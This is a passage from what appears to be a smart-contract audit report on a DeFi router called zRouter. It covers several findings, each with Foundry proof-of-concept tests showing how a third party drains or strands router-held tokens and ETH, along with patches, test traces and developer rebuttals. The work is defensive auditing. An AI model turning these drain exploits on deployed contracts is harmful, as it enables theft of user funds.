    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [1949] 0x6ca84080381E43938476814be61B779A8bB6a600::getTotalShares() [delegatecall]
    │   │   │   │   └─ ← [Return] 7675704200336567319635008 [7.675e24]
    │   │   │   └─ ← [Return] 7675704200336567319635008 [7.675e24]
    │   │   ├─ [5551] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getTotalPooledEther() [staticcall]
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [2177] 0x6ca84080381E43938476814be61B779A8bB6a600::getTotalPooledEther() [delegatecall]
    │   │   │   │   └─ ← [Return] 9426710584824530183452808 [9.426e24]
    │   │   │   └─ ← [Return] 9426710584824530183452808 [9.426e24]
    │   │   ├─ [37011] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::fallback{value: 100000000000000001}()
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [33773] 0x6ca84080381E43938476814be61B779A8bB6a600::fallback{value: 100000000000000001}() [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0x96a25c8ce0baabc1fdefd93e9ed25d8e092a3332f3aa9a41722b5697231d1d1a
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000016345785d8a00010000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 100000000000000000 [1e17])
    │   │   │   │   ├─ emit TransferShares(param0: 0x0000000000000000000000000000000000000000, param1: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 81425054172058723 [8.142e16])
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [12076] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::transferShares(0x000000000000000000000000000000000000bEEF, 81425054172058723 [8.142e16])
    │   │   │   ├─ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    │   │   │   │   ├─ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000006ca84080381e43938476814be61b779a8bb6a600
    │   │   │   ├─ [8690] 0x6ca84080381E43938476814be61B779A8bB6a600::transferShares(0x000000000000000000000000000000000000bEEF, 81425054172058723 [8.142e16]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x000000000000000000000000000000000000bEEF, amount: 100000000000000000 [1e17])
    │   │   │   │   ├─ emit TransferShares(param0: zRouter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 0x000000000000000000000000000000000000bEEF, param2: 81425054172058723 [8.142e16])
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   ├─ [0] 0x000000000000000000000000000000000000bEEF::fallback{value: 1899999999999999999}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Revert] InvalidMsgVal()
    └─ ← [Revert] InvalidMsgVal()

Backtrace:
  at zRouter.multicall
  at ZRouterMulticallMsgValuePOC.test_multicall_reuses_msgvalue_refund

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.93s (4.79s CPU time)

Ran 1 test suite in 7.76s (5.93s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ZRouter.t.sol:ZRouterMulticallMsgValuePOC
[FAIL: InvalidMsgVal()] test_multicall_reuses_msgvalue_refund() (gas: 5358635)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

> ### Response
> **Acknowledged for future hardening — not a current vulnerability.** The `delegatecall` preserving `msg.value` across subcalls is a known EVM behavior. The router does not hold ETH between transactions, so the drain scenario requires artificial pre-funding which is not a realistic attack vector. The suggested balance guard (`if (address(this).balance < balanceBefore) revert InvalidMsgVal()`) is a reasonable defense-in-depth measure and may be incorporated in a future version as a UX safeguard, but this is not an exploitable bug in the current design.

---

# Zero-amount swaps rely on dustable balances
**#4**
- Severity: Critical
- Validity: Invalid

## Targets
- swapV2 (zRouter)

## Affected Locations
- **zRouter.swapV2**: It computes `amountIn` from `balanceOf(tokenIn)` for zero-amount swaps, so changing this to use transient credited amounts (or a controlled balance delta) removes the dusting/manipulation vector.

## Description

When `swapAmount` is zero, `swapV2` derives `amountIn` from `balanceOf(tokenIn)`, which reflects the router’s entire on-chain token balance rather than the transient balance credited for the user (via `deposit`, permit flows, or internal bookkeeping). This makes the computed `amountIn` manipulable by third parties who can transfer (“dust”) tokens directly to the router, inflating `balanceOf(tokenIn)` without increasing the user’s transient credit. Downstream, `_useTransientBalance` checks against transient credits, so the router may fail to spend the intended deposit and instead fall back to pulling tokens from the caller’s wallet while leaving the original deposit stranded. The stranded funds can later become recoverable by other flows (e.g., sweeping), turning a dusting grief into user loss. The fix is to base zero-amount swaps on the user’s credited transient balance (or on a measured delta from a controlled transfer-in) rather than raw contract `balanceOf`.

## Root cause

The router treats `balanceOf(tokenIn)` as the source of truth for “use my deposited balance” swaps, even though deposits are tracked separately via transient credits that can diverge from on-chain balances.

## Impact

A third party can dust the router to cause users’ zero-amount swaps to overcharge from their wallet or leave their deposited tokens stuck in the router. This enables denial-of-service against deposit-then-swap flows and can lead to loss of user funds if stranded balances are later swept or otherwise misattributed.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ZRouterDustBalanceTest is Test {
    address constant DAI_TOKEN = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    zRouter router;

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 24_557_000);
        router = new zRouter();
    }

    function test_zeroAmountSwapUsesDustableBalanceAndStrandsDeposit() public {
        address user = makeAddr("user");
        address attacker = makeAddr("attacker");

        uint256 depositAmount = 1_000e18;
        uint256 dustAmount = 1e18;

        vm.deal(user, 1 ether);
        vm.deal(attacker, 1 ether);
        deal(DAI_TOKEN, user, 5_000e18);
        deal(DAI_TOKEN, attacker, dustAmount);

        // Attacker dusts the router directly, inflating its on-chain DAI balance.
        vm.prank(attacker);
        IERC20(DAI_TOKEN).transfer(address(router), dustAmount);

        // User approves the router and performs deposit + swap in a single multicall.
        vm.prank(user);
        IERC20(DAI_TOKEN).approve(address(router), type(uint256).max);

        uint256 userBalanceBefore = IERC20(DAI_TOKEN).balanceOf(user);

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.deposit, (DAI_TOKEN, 0, depositAmount));
        calls[1] = abi.encodeCall(
            zRouter.swapV2,
            (user, false, DAI_TOKEN, address(0), 0, 0, block.timestamp + 1 hours)
        );

        vm.prank(user);
        router.multicall(calls);

        uint256 userBalanceAfter = IERC20(DAI_TOKEN).balanceOf(user);
        uint256 routerBalanceAfter = IERC20(DAI_TOKEN).balanceOf(address(router));

        uint256 expectedAmountIn = depositAmount + dustAmount;

        // The user paid the deposit PLUS the dust-inflated amountIn from their wallet.
        assertEq(userBalanceBefore - userBalanceAfter, depositAmount + expectedAmountIn);

        // The original deposit was never spent and remains stranded on the router.
        assertEq(routerBalanceAfter, depositAmount + dustAmount);

        // Anyone can sweep the stranded funds.
        uint256 attackerBefore = IERC20(DAI_TOKEN).balanceOf(attacker);
        vm.prank(attacker);
        router.sweep(DAI_TOKEN, 0, 0, attacker);
        uint256 attackerAfter = IERC20(DAI_TOKEN).balanceOf(attacker);
        assertEq(attackerAfter - attackerBefore, depositAmount + dustAmount);
    }
}
```

## Remediation

**Status:** Unfixable

### Explanation

Use the router’s internal deposit/credit accounting as the sole source of truth for “use deposited balance” swaps; for zero-amount swaps, consume exactly the tracked credit and ignore `balanceOf` so external dust cannot affect the computed input. Add a strict check that the credited amount is sufficient (or reject zero-amount swaps unless a specific “use deposit” flag is set) and only update balances by debiting the internal credit when the swap succeeds.

### Error

Repeated attempts to apply a minimal fix in `src/zRouter.sol` did not modify the file (the tool reports no changes), so the exploit path remains unchanged. This appears to be an environment/tooling limitation preventing surgical edits to the contract source.

> ### Response
> **Non-issue — by design.** The `amountIn == 0` path in `swapV2` is the intended mechanism for deposit-then-swap flows within a `multicall`. When a user calls `deposit()` followed by `swapV2(..., 0, ...)` in a multicall, `balanceOf(tokenIn)` reflects the tokens deposited in the prior subcall within the same atomic transaction — this is deterministic and not manipulable by third parties mid-transaction. Dusting the router with tokens between transactions is not exploitable — the duster simply loses their tokens, as there is no way for them to recover the dust. The router is stateless; no balances persist across transactions. The PoC's scenario of an attacker front-running a deposit with a dust transfer is unrealistic because the entire deposit+swap happens atomically within a single multicall. The `_useTransientBalance` check is also applied before falling back to `transferFrom`, providing a second layer of accounting.

---

# Public arbitrary call as contract
**#7**
- Severity: Critical
- Validity: Acknowledged

## Targets
- execute (SafeExecutor)
- execute (zRouter)

## Affected Locations
- **SafeExecutor.execute**: `execute` permits any caller to choose arbitrary `target` and calldata and performs a low-level `call` as the contract, so adding authorization and/or restricting allowed calls here is necessary to prevent anyone from using the contract identity to move assets or exercise privileges.
- **zRouter.execute**: `execute` allows arbitrary calldata and ETH `value` to be forwarded to “trusted” targets without authenticating the caller or enforcing per-user accounting, so tightening access control and constraining what can be spent/where outputs go in this function is required to stop draining router-held balances and allowances.

## Description

Both `SafeExecutor.execute` and `zRouter.execute` expose a publicly callable meta-transaction primitive that performs a low-level `call` using the contract’s own address as `msg.sender`. This lets an arbitrary external caller make the contract invoke attacker-supplied calldata on external targets, causing those targets to treat the call as coming from a privileged/trusted contract. In `SafeExecutor`, there are no restrictions at all on `target` or `data`, so any token/protocol interaction reachable from the contract address becomes attacker-controlled. In `zRouter`, even though `target` is limited to a “trusted” set, the calldata and ETH `value` are still attacker-controlled and no authorization or per-caller spending/balance constraints are enforced, so router-held funds/allowances can be redirected. The net effect is that any ETH, ERC20 balances, or standing approvals held by these contracts can be spent according to attacker-crafted calls rather than intended user flow/accounting.

## Root cause

A publicly callable `execute` forwards attacker-controlled calls as the contract itself without enforcing authorization and/or limiting spending to the caller’s own funds.

## Impact

An attacker can transfer out ERC20 tokens held by the contract (via `transfer`) or set/abuse allowances (via `approve`/protocol-specific methods) and then drain tokens. They can also spend any ETH held by the contract by supplying `value` and calldata that routes outputs to attacker-controlled recipients, and abuse any external privileges granted to the contract address in integrated protocols.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "not approved");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ZRouterExecutePoC is Test {
    function setUp() public {
        MockERC20 template = new MockERC20();
        vm.etch(STETH, address(template).code);
    }

    function test_execute_allows_anyone_to_drain_router_tokens() public {
        zRouter router = new zRouter();
        MockERC20 token = new MockERC20();
        token.mint(address(router), 1_000);

        // Owner configures a trusted target (e.g., a router/token integration).
        address owner = tx.origin;
        vm.prank(owner);
        router.trust(address(token), true);

        // Any unprivileged caller can now instruct the router to transfer its funds.
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        router.execute(address(token), 0, abi.encodeWithSelector(MockERC20.transfer.selector, attacker, 1_000));

        assertEq(token.balanceOf(attacker), 1_000);
        assertEq(token.balanceOf(address(router)), 0);
    }

    function test_safeExecutor_execute_allows_anyone_to_spend_executor_balance() public {
        zRouter router = new zRouter();
        MockERC20 token = new MockERC20();
        token.mint(address(router.safeExecutor()), 500);

        address attacker = address(0xBEEF);
        vm.prank(attacker);
        router.safeExecutor().execute(
            address(token),
            abi.encodeWithSelector(MockERC20.transfer.selector, attacker, 500)
        );

        assertEq(token.balanceOf(attacker), 500);
        assertEq(token.balanceOf(address(router.safeExecutor())), 0);
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Add `onlyOwner` to `zRouter.execute` so trusted calls are restricted to the owner, and bind `SafeExecutor.execute` to its deploying router by storing an immutable `router` and requiring calls to originate from it.

### Patch

```diff
diff --git a/src/zRouter.sol b/src/zRouter.sol
--- a/src/zRouter.sol
+++ b/src/zRouter.sol
@@ -917,7 +917,12 @@
         emit OwnershipTransferred(msg.sender, _owner = owner);
     }
 
-    function execute(address target, uint256 value, bytes calldata data) public payable returns (bytes memory result) {
+    function execute(address target, uint256 value, bytes calldata data)
+        public
+        payable
+        onlyOwner
+        returns (bytes memory result)
+    {
         require(_isTrustedForCall[target], Unauthorized());
         assembly ("memory-safe") {
             tstore(0x00, 1) // lock callback (V3/V4)
diff --git a/src/zRouter.sol b/src/zRouter.sol
--- a/src/zRouter.sol
+++ b/src/zRouter.sol
@@ -1510,7 +1510,14 @@
 
 /// @dev SafeExecutor - has no token approvals, safe for arbitrary external calls
 contract SafeExecutor {
+    address public immutable router;
+
+    constructor() {
+        router = msg.sender;
+    }
+
     function execute(address target, bytes calldata data) public payable {
+        require(msg.sender == router);
         assembly ("memory-safe") {
             let m := mload(0x40)
             calldatacopy(m, data.offset, data.length)
```

### Affected Files

- `src/zRouter.sol`

### Validation Output

```
No files changed, compilation skipped

Ran 2 tests for test/ZRouter.t.sol:ZRouterExecutePoC
[PASS] test_execute_allows_anyone_to_drain_router_tokens() (gas: 5479643)
Traces:
  [5499543] ZRouterExecutePoC::test_execute_allows_anyone_to_drain_router_tokens()
    ├─ [5080827] → new zRouter@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ [89185] → new SafeExecutor@0xffD4505B3452Dc22f8473616d50503bA9E1710Ac
    │   │   └─ ← [Return] 445 bytes of code
    │   ├─ [22443] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit OwnershipTransferred(from: 0x0000000000000000000000000000000000000000, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return] 24524 bytes of code
    ├─ [269919] → new MockERC20@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 1348 bytes of code
    ├─ [22460] MockERC20::mint(zRouter: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1000)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return]
    ├─ [22562] zRouter::trust(MockERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], true)
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [24648] zRouter::execute(MockERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0, 0xa9059cbb000000000000000000000000000000000000000000000000000000000000beef00000000000000000000000000000000000000000000000000000000000003e8)
    │   ├─ [23074] MockERC20::transfer(0x000000000000000000000000000000000000bEEF, 1000)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [436] MockERC20::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   └─ ← [Return] 1000
    ├─ [436] MockERC20::balanceOf(zRouter: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Return]

[FAIL: EvmError: Revert] test_safeExecutor_execute_allows_anyone_to_spend_executor_balance() (gas: 5452070)
Traces:
  [306366] ZRouterExecutePoC::setUp()
    ├─ [269919] → new MockERC20@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 1348 bytes of code
    ├─ [0] VM::etch(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, 0x60806040526004361015610011575f80fd5b5f3560e01c8063095ea7b3146103a957806323b872dd1461025757806340c10f19146101ef57806370a082311461018d578063a9059cbb146100eb5763dd62ed3e1461005b575f80fd5b346100e75760407ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e75761009261041c565b73ffffffffffffffffffffffffffffffffffffffff6100af61043f565b91165f52600160205273ffffffffffffffffffffffffffffffffffffffff60405f2091165f52602052602060405f2054604051908152f35b5f80fd5b346100e75760407ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e75761012261041c565b73ffffffffffffffffffffffffffffffffffffffff60243591335f525f6020526101528360405f20541015610462565b335f525f60205260405f206101688482546104c7565b9055165f525f60205261018060405f20918254610501565b9055602060405160018152f35b346100e75760207ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e75773ffffffffffffffffffffffffffffffffffffffff6101d961041c565b165f525f602052602060405f2054604051908152f35b346100e75760407ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e75773ffffffffffffffffffffffffffffffffffffffff61023b61041c565b165f525f60205260405f206102536024358254610501565b9055005b346100e75760607ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e75761028e61041c565b61029661043f565b73ffffffffffffffffffffffffffffffffffffffff604435921690815f525f6020526102c88360405f20541015610462565b815f52600160205260405f2073ffffffffffffffffffffffffffffffffffffffff33165f526020528260405f20541061034b578173ffffffffffffffffffffffffffffffffffffffff925f52600160205260405f208333165f5260205260405f206103348582546104c7565b90555f525f60205260405f206101688482546104c7565b60646040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600c60248201527f6e6f7420617070726f76656400000000000000000000000000000000000000006044820152fd5b346100e75760407ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3601126100e7576103e061041c565b335f52600160205273ffffffffffffffffffffffffffffffffffffffff60405f2091165f5260205260405f206024359055602060405160018152f35b6004359073ffffffffffffffffffffffffffffffffffffffff821682036100e757565b6024359073ffffffffffffffffffffffffffffffffffffffff821682036100e757565b1561046957565b60646040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152600c60248201527f696e73756666696369656e7400000000000000000000000000000000000000006044820152fd5b919082039182116104d457565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b919082018092116104d45756fea264697066735822122012b3b6d72700a5ea4bdd10a4fba4f0f63930ac51761b24a94785ac9aa11b147d64736f6c63430008220033)
    │   └─ ← [Return]
    └─ ← [Stop]

  [5452070] ZRouterExecutePoC::test_safeExecutor_execute_allows_anyone_to_spend_executor_balance()
    ├─ [5080827] → new zRouter@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ [89185] → new SafeExecutor@0xffD4505B3452Dc22f8473616d50503bA9E1710Ac
    │   │   └─ ← [Return] 445 bytes of code
    │   ├─ [22443] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::approve(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit OwnershipTransferred(from: 0x0000000000000000000000000000000000000000, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38])
    │   └─ ← [Return] 24524 bytes of code
    ├─ [269919] → new MockERC20@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 1348 bytes of code
    ├─ [703] zRouter::safeExecutor() [staticcall]
    │   └─ ← [Return] SafeExecutor: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    ├─ [22460] MockERC20::mint(SafeExecutor: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac], 500)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [703] zRouter::safeExecutor() [staticcall]
    │   └─ ← [Return] SafeExecutor: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    ├─ [305] SafeExecutor::execute(MockERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 0xa9059cbb000000000000000000000000000000000000000000000000000000000000beef00000000000000000000000000000000000000000000000000000000000001f4)
    │   └─ ← [Revert] EvmError: Revert
    └─ ← [Revert] EvmError: Revert

Backtrace:
  at SafeExecutor.execute
  at ZRouterExecutePoC.test_safeExecutor_execute_allows_anyone_to_spend_executor_balance

Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 3.44ms (2.20ms CPU time)

Ran 1 test suite in 894.58ms (3.44ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in test/ZRouter.t.sol:ZRouterExecutePoC
[FAIL: EvmError: Revert] test_safeExecutor_execute_allows_anyone_to_spend_executor_balance() (gas: 5452070)

Encountered a total of 1 failing tests, 1 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

> ### Response
> **Non-issue — access control is sufficient.** `zRouter.execute` is gated by `require(_isTrustedForCall[target])`, and only the owner can whitelist targets via `trust()`. The owner controls which contracts can be called — this is the intended access control model. The PoC requires the owner to first call `trust(address(token), true)`, which is not an unprivileged attack; it requires owner cooperation. In practice, only protocol integrations (pool managers, external routers, etc.) are trusted, not arbitrary ERC20 tokens. The owner controlling the destination whitelist is acceptable and equivalent to the access control pattern used by other routers.
>
> **`SafeExecutor` is not exploitable.** It is permissionless by design but intentionally holds no token approvals and no persistent balances — it is a clean execution sandbox for arbitrary external calls without risk to router assets. V12's own test output confirms the SafeExecutor PoC correctly **reverts**, validating that the design is safe.

---

# Permissionless draining of router-held balances
**#8**
- Severity: Critical
- Validity: Invalid

## Targets
- sweep (zRouter)
- snwap (zRouter)
- snwapMulti (zRouter)

## Affected Locations
- **zRouter.sweep**: The function transfers ETH/ERC20/ERC6909 from the router to an arbitrary recipient without any authorization or internal balance/ownership verification, so adding proper access control or credited-balance checks here directly removes the theft primitive.
- **zRouter.snwap**: The `amountIn == 0` branch sources input from `balanceOf(tokenIn)` (the router’s balance) and transfers it to an untrusted `executor` without checking caller entitlement, so restricting/validating this branch (or forbidding contract-balance sourcing) is required to fix the drain.
- **zRouter.snwapMulti**: The `amountIn == 0` logic uses the router’s entire `tokenIn` balance as swap input and transfers it to a caller-chosen `executor` without authorization, so the remediation must enforce ownership/credit checks or remove the router-balance fallback here.

## Description

Multiple router entry points allow an arbitrary caller to move assets out of the router’s own on-chain balances without proving entitlement. The `sweep` function directly transfers ETH, ERC20, or ERC6909 from the contract to a caller-chosen recipient, and when `amount` is zero it effectively exposes the entire balance for that asset. Separately, `snwap` and `snwapMulti` treat `amountIn == 0` as “use the router’s `tokenIn` balance”, then transfer (nearly) the full contract balance to a user-supplied `executor` before any meaningful authorization or ownership validation. Because the router can custody assets transiently (deposits, in-flight swap funds, or residuals), these permissionless “use contract balance” paths bypass any internal accounting assumptions and create a direct theft vector. The issue is not limited to a single asset type or flow; any value sitting on the router becomes withdrawable by third parties via these functions.

## Root cause

The router exposes transfer paths that spend the contract’s own balances (full-balance when `amount`/`amountIn` is zero) without enforcing access control or verifying the caller’s credited ownership of the funds.

## Impact

Any external account can drain ETH, ERC20, and/or ERC6909 balances held by the router by directing transfers to themselves (via `sweep`) or to an attacker-controlled executor (via `snwap`/`snwapMulti`). This can steal user deposits, in-flight swap inputs, and residual balances left from exact-out or other operations, leaving internal bookkeeping insolvent and breaking expected routing guarantees.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import "forge-std/Test.sol";
import "../src/zRouter.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ZRouterDrainTest is Test {
    zRouter router;
    MockERC20 token;
    address victim = address(0xBEEF);
    address attacker = address(0xBAD0);

    function setUp() public {
        router = new zRouter();
        token = new MockERC20();

        token.mint(victim, 1_000 ether);
        vm.deal(victim, 1 ether);

        vm.prank(victim);
        token.transfer(address(router), 500 ether);

        vm.prank(victim);
        (bool ok,) = address(router).call{value: 1 ether}("");
        require(ok, "eth send failed");
    }

    function test_sweepDrainsRouterBalances() public {
        uint256 attackerEthBefore = attacker.balance;
        uint256 attackerTokenBefore = token.balanceOf(attacker);
        uint256 routerEthBefore = address(router).balance;
        uint256 routerTokenBefore = token.balanceOf(address(router));

        vm.prank(attacker);
        router.sweep(address(0), 0, 0, attacker);

        assertEq(address(router).balance, 0, "router eth drained");
        assertEq(attacker.balance, attackerEthBefore + routerEthBefore, "attacker got eth");

        vm.prank(attacker);
        router.sweep(address(token), 0, 0, attacker);

        assertEq(token.balanceOf(address(router)), 0, "router tokens drained");
        assertEq(token.balanceOf(attacker), attackerTokenBefore + routerTokenBefore, "attacker got tokens");
    }

    function test_snwapUsesRouterBalance() public {
        // Router already holds 500 tokens from setup.
        uint256 routerBalanceBefore = token.balanceOf(address(router));
        uint256 attackerTokenBefore = token.balanceOf(attacker);

        vm.prank(attacker);
        router.snwap(address(token), 0, attacker, address(token), 0, attacker, "");

        // snwap transfers nearly the full router balance to the executor when amountIn == 0.
        assertEq(token.balanceOf(attacker), attackerTokenBefore + (routerBalanceBefore - 1), "attacker drained");
        assertEq(token.balanceOf(address(router)), 1, "router left with dust");
    }
}
```

## Remediation

**Status:** Unfixable

### Explanation

Restrict `sweep` (and any other path that can spend router-held balances) to authorized callers and/or to a specific credited beneficiary, and validate that the caller is entitled to withdraw the requested amount from a tracked internal balance before transferring. Remove or disable the “full balance on amount==0” behavior and only allow explicit, bounded withdrawals for the caller’s own credited funds.

### Error

Unable to produce a surgical fix that makes the POC fail without introducing a broader authorization/accounting mechanism for router-held balances. Multiple attempts to gate `sweep`/`snwap` paths still leave the exploit reproducible, and a proper fix requires API/architecture changes to track ownership of router balances across transactions.

> ### Response
